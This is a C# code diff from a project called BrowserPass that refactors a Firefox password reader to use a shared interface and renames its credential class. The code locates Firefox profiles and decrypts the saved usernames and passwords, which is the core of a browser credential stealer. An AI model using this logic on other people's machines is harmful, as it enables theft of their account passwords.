@@ -6,9 +6,10 @@ using System.IO;
 
 namespace BrowserPass
 {
-    class FirefoxPassReader
+    class FirefoxPassReader : IPassReader
     {
-        public IEnumerable<BrowserCredential> ReadPasswords()
+        public string BrowserName { get { return "Firefox"; } }
+        public IEnumerable<CredentialModel> ReadPasswords()
         { 
             string signonsFile = null;
             string loginsFile = null;
@@ -16,7 +17,7 @@ namespace BrowserPass
             bool loginsFound = false;
             string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
 
-            var logins = new List<BrowserCredential>();
+            var logins = new List<CredentialModel>();
             if (dirs.Length == 0)
                 return logins;
 
@@ -60,7 +61,7 @@ namespace BrowserPass
                                 string username = FFDecryptor.Decrypt(reader.GetString(0));
                                 string password = FFDecryptor.Decrypt(reader.GetString(1));
                                 
-                                logins.Add(new BrowserCredential
+                                logins.Add(new CredentialModel
                                 {
                                     Username = username,
                                     Password = password,
@@ -87,7 +88,7 @@ namespace BrowserPass
                 {
                     string username = FFDecryptor.Decrypt(loginData.encryptedUsername);
                     string password = FFDecryptor.Decrypt(loginData.encryptedPassword);
-                    logins.Add(new BrowserCredential
+                    logins.Add(new CredentialModel
                     {
                         Username = username,
                         Password = password,
